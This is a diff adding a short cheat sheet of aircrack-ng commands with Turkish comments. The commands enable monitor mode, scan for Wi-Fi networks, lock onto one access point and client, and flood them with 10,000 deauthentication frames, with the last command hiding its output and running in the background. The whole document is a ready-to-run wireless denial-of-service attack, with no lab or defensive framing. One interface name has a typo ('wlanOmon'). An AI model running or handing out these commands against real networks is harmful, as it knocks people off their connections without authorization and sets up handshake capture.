@@ -1,0 +1,5 @@
+airmon-ng start wlan0
+airodump-ng wlan0mon // wifi tespit et
+airodump-ng --bssid <modemmacadresi> --channel <kanal> wlanOmon
+aireplay-ng --deauth 10000 -a <modeminmacadresi> -c <cihazinmac adresi> wlan0mon 
+aireplay-ng --deauth 10000 -a <modeminmacadresi> -c <cihazmacadresi> wlan0mon &> /dev/null& // bu komut ile sureci arka plana alabiliriz
